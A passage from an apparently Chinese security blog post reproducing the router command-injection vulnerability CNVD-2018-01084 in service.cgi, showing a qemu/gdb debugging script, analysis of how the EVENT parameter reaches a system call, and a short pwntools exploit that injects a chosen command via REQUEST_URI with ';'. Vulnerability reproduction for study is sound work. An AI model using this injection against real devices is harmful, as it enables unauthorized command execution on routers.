+<p>这些都不好通过静态分析直接得出。猜测是由用户控制的。同时之前的<code>REQUESR_URI</code>环境变量分割出的字符串被存放进了内存中，猜测这里拼接的内容应该是我们之前输入存放的，为了验证这一观点，所以我们需要通过动态调试来验证一下。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">INPUT=<span class="string">&quot;0000000000&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="variable">$INPUT</span> | qemu-mipsel -L . \</span><br><span class="line">    -g 1234 \</span><br><span class="line">    -0 <span class="string">&quot;service.cgi&quot;</span> \</span><br><span class="line">    -E REQUEST_URI=<span class="string">&quot;aaa?bbb=ccc&quot;</span> \</span><br><span class="line">    -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> \</span><br><span class="line">    -E CONTENT_LENGTH=10 \</span><br><span class="line">    -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">    ./htdocs/cgibin</span><br></pre></td></tr></table></figure>
+
+<p>这是测试的脚本，然后我们在目标函数处打上断点，最后可以在gdb动态调试中看到</p>
+<p><img src="/images/cve2-2.png" alt="gdb"></p>
+<p>这里去和<code>EVENT</code>去比对的是我们的<code>bbb</code>，也就是<code>REQUEST_URI</code>中<code>?</code>和<code>=</code>之间的字符串。然后我们把<code>bbb</code>换成<code>EVENT</code>就可以成功触发<code>lxmldbc_system</code>函数了。</p>
+<p><img src="/images/cve2-3.png" alt="gdb"></p>
+<p>可以看出来，这里传入的<code>va</code>就是<code>ccc</code>，也就是我们<code>=</code>键对后的数据。</p>
+<p>所以到目前为止，我们就已经完成了对这个二进制文件中的漏洞分析。显然，我们只需要利用<code>;</code>来连接两个独立语句就可以执行了。</p>
+<h2 id="二-exp"><a href="#二-exp" class="headerlink" title="二.exp"></a>二.exp</h2><p>脚本就很简单了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">string = <span class="string">&quot;x1z1&quot;</span></span><br><span class="line">length = <span class="built_in">len</span>(string)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----- CNVD-2018-01084 -----\n&quot;</span>)</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;command &gt; &quot;</span>)</span><br><span class="line"> </span><br><span class="line">io = process(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L . -strace \</span></span><br><span class="line"><span class="string">    -0 &quot;service.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=<span class="subst">&#123;length&#125;</span> \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;?EVENT=;<span class="subst">&#123;cmd&#125;</span>;&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=&quot;uid=winmt&quot; \</span></span><br><span class="line"><span class="string">    -E REMOTE_ADDR=&quot;x1z1&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line">io.send(string)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>借鉴：</p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272212-1.htm">原创] CNVD-2018-01084 漏洞复现报告（service.cgi 远程命令执行漏洞）-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<p>[CNVD-2018-01084 命令注入漏洞 | Hexo](<a target="_blank" rel="noopener" href="https://khighl.github.io/2025/06/16/CNVD-2018-01084">https://khighl.github.io/2025/06/16/CNVD-2018-01084</a> 命令注入漏洞&#x2F;)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/08/05/CNVD-2018-01084/">http://example.com/2026/08/05/CNVD-2018-01084/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/07/23/CNVD-2013-11625-DIR-815/" title="CNVD-2013-11625_DIR-815"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-23</div><div class="info-item-2">CNVD-2013-11625_DIR-815</div></div><div class="info-2"><div class="info-item-1">CNVD-2013-11625 DIR-815 栈溢出漏洞官方的漏洞报告：国家信息安全漏洞共享平台 固件下载地址:下载 (需要挂梯子) binwalk安装：sudo apt install binwalk sasquatch安装：https://github.com/devttys0/sasquatch （直接在命令行里git下来就好了，然后问下ai怎么安装。如果在运行build.sh脚本时出现问题，先不要慌，下面可能有符合你的解决方法。如果还是失败，交给ai） 一.固件提取1binwalk -e --preserve-symlinks firmware_name  在下载完这些工具，提取时可能会出现一些问题。 12345678910111213141516171819202122232425x1z1@x1z1:~/Desktop/CNVD-2013-11625 DIR-815/dir815_FW_101$ binwalk -e --preserve-symlinks DIR-815_v1.01b14.binTraceback (most recent call last):  ...</div></div></div></a><a class="pagination-related" href="/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/" title="异架构汇编"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-16</div><div class="info-item-2">异架构汇编</div></div><div class="info-2"><div class="info-item-1">异架构汇编异架构汇编存在三种，分别是PowerPC，ARM&amp;AARCH64，MIPS 从 x86 到 RISCx86 是 CISC（复杂指令集），而 ARM、MIPS、PowerPC 均属于 RISC（精简指令集）。  Load&#x2F;Store 架构：RISC 架构不能直接对内存中的数据进行加减乘除等运算。必须先将数据 Load 到寄存器中，在寄存器里完成运算，然后再 Store 回内存。 寄存器数量多：通常有 32 个以上的通用寄存器。因此，函数传参主要依赖寄存器，而不是像早期 x86 那样依赖栈。 指令定长：大多数情况下指令长度固定为 4 字节（除了 ARM 的 Thumb 模式），这对 ROP 链的构造和 shellcode 的编写影响巨大。  PowerPC(工业控制与汽车电子)PowerPC 架构下的函数调用约定是通过寄存器传递参数，而不是通过栈传递参数。但当参数数量过多时，会将多余的参数压入栈中，因此栈帧中也会包含函数参数。 寄存器设计复杂：拥有 32 个通用寄存器 (GPR)，还有专门的链接寄存器 (LR)、计数器寄存器 (CTR) 和条件寄存器 (C...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/05/CNVD-2018-01084/" title="CNVD-2018-01084">CNVD-2018-01084</a><time datetime="2026-08-04T16:50:30.000Z" title="发表于 2026-08-05 00:50:30">2026-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/23/CNVD-2013-11625-DIR-815/" title="CNVD-2013-11625_DIR-815">CNVD-2013-11625_DIR-815</a><time datetime="2026-07-23T04:30:41.000Z" title="发表于 2026-07-23 12:30:41">2026-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/" title="异架构汇编">异架构汇编</a><time datetime="2026-07-16T07:39:14.000Z" title="发表于 2026-07-16 15:39:14">2026-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/05/Pwn%E5%85%A5%E9%97%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Pwn入门环境搭建">Pwn入门环境搭建</a><time datetime="2026-07-05T15:10:51.827Z" title="发表于 2026-07-05 23:10:51">2026-07-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/04/Login/" title="Login">Login</a><time datetime="2026-06-04T01:52:38.000Z" title="发表于 2026-06-04 09:52:38">2026-06-04</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CVE%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">CVE复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.37em; color: #99a4b2">pwn入门</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a> <a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/IOT/" style="font-size: 1.23em; color: #999ea6">IOT</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/08/">
+            <span class="card-archive-list-date">
+              八月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/07/">
+            <span class="card-archive-list-date">
+              七月 2026
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">38</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-08-05T09:55:59.335Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
